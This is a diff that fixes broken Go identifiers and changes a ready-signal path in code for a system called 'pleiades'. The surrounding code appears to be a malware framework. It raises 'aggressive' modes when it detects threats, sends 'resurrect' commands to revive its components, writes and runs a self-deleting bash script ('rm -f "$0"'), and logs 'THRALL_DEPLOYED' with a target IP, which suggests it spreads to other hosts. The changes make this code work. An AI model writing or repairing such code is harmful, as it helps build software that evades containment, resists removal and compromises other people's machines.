@@ -143,10 +143,10 @@ nc_unix_send() {
         printf '%s\n' "$msg" | nc -U "$sock" -w 1 2>/dev/null || true
     fi
 }
-signal_ready() { mkdir -p /run/pleiades/ready; touch "/run/pleiades/ready/$1"; }
+signal_ready() { mkdir -p /var/lib/pleiades/ready; touch "/var/lib/pleiades/ready/$1"; }
 wait_for()     {
     local name="$1" timeout="${2:-90}" elapsed=0
-    while [[ ! -f "/run/pleiades/ready/$name" ]]; do
+    while [[ ! -f "/var/lib/pleiades/ready/$name" ]]; do
         (( elapsed >= timeout )) && { logger -t pleiades "WARN: timeout waiting for $name"; return 0; }
         sleep 2; (( elapsed += 2 ))
     done
@@ -361,10 +361,10 @@ import (
 )
 
 var threatScore int64
-var pleiades-rebirthNeeded bool
+var pleiadesRebirthNeeded bool
 var containmentTriggered bool
 
-func reportToPleiades Nexus(msg string) {
+func reportToPleiadesNexus(msg string) {
     f, err := os.OpenFile("/run/pleiades/pleiades-nexus_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK, 0666)
     if err == nil {
         defer f.Close()
@@ -408,15 +408,15 @@ func parseLine(line string) {
         }
     } else if strings.HasPrefix(line, "BGP_HIJACK") || strings.HasPrefix(line, "THERMAL_ANOMALY") {
         updateScore(50)
-        pleiades-rebirthNeeded = true
+        pleiadesRebirthNeeded = true
     } else if strings.Contains(line, "PLEIADES_REBIRTH_TRIGGERED") {
-        pleiades-rebirthNeeded = true
-        reportToPleiades Nexus("ZOD_PLEIADES_REBIRTH_ACK")
+        pleiadesRebirthNeeded = true
+        reportToPleiadesNexus("ZOD_PLEIADES_REBIRTH_ACK")
         os.WriteFile("/run/pleiades/pleiades-rebirth_acknowledged", []byte("done"), 0644)
     } else if strings.Contains(line, "CONTAINMENT_TRIGGERED") {
         containmentTriggered = true
         atomic.StoreInt64(&threatScore, 0)
-        reportToPleiades Nexus("ZOD_containment_ACK")
+        reportToPleiadesNexus("ZOD_containment_ACK")
     }
 }
 
@@ -466,20 +466,20 @@ func main() {
             modeStr = "AGGRESSIVE"
             sendCommand("/run/pleiades/taygete.sock", "aggressive")
             sendCommand("/run/pleiades/alcyone.sock", "active")
-            reportToPleiades Nexus(fmt.Sprintf("ZOD_MODE_AGGRESSIVE|%d", score))
+            reportToPleiadesNexus(fmt.Sprintf("ZOD_MODE_AGGRESSIVE|%d", score))
         } else if score >= 2 {
             modeStr = "PASSIVE"
             sendCommand("/run/pleiades/alcyone.sock", "passive")
-            reportToPleiades Nexus(fmt.Sprintf("ZOD_MODE_PASSIVE|%d", score))
+            reportToPleiadesNexus(fmt.Sprintf("ZOD_MODE_PASSIVE|%d", score))
         } else {
             modeStr = "NORMAL"
         }
         os.WriteFile("/run/pleiades/atlas_mode", []byte(modeStr), 0644)
-        if pleiades-rebirthNeeded && !containmentTriggered {
+        if pleiadesRebirthNeeded && !containmentTriggered {
             sendCommand("/run/pleiades/taygete.sock", "resurrect")
             sendCommand("/run/pleiades/alcyone.sock", "resurrect")
-            reportToPleiades Nexus("ZOD_PLEIADES_REBIRTH_SIGNAL")
-            pleiades-rebirthNeeded = false
+            reportToPleiadesNexus("ZOD_PLEIADES_REBIRTH_SIGNAL")
+            pleiadesRebirthNeeded = false
         }
         if containmentTriggered {
             // Reset everything
@@ -519,7 +519,7 @@ const (
     banner          = "\n   ____   ____   _      _   _   _   _   ____   _   _   ____   \n  | __ ) | __ ) | |    | | | | | \\ | | / ___| | \\ | | / ___|  \n  |  _ \\ |  _ \\ | |    | | | | |  \\| | | |  _  |  \\| | | |  _ \n  | |_) || |_) || |___ | |_| | | |\\  | | |_| || |\\  | | |_| | \n  |____/ |____/ |_____| \\___/  |_| \\_|  \\____||_| \\_|  \\____| \n  \n   B   O   B   B   Y       L   O   N   G   !   !   ~\n"
 )
 
-func reportToPleiades Nexus(msg string) {
+func reportToPleiadesNexus(msg string) {
     f, _ := os.OpenFile("/run/pleiades/pleiades-nexus_fifo", os.O_WRONLY|os.O_APPEND|syscall.O_NONBLOCK, 0666)
     if f != nil {
         defer f.Close()
@@ -568,7 +568,7 @@ rm -f "$0"
     os.WriteFile(script, []byte(content), 0755)
     cmd := exec.Command("/bin/bash", script)
     cmd.Start()
-    reportToPleiades Nexus(fmt.Sprintf("THRALL_DEPLOYED|%s", ip))
+    reportToPleiadesNexus(fmt.Sprintf("THRALL_DEPLOYED|%s", ip))
 }
 
 func main() {
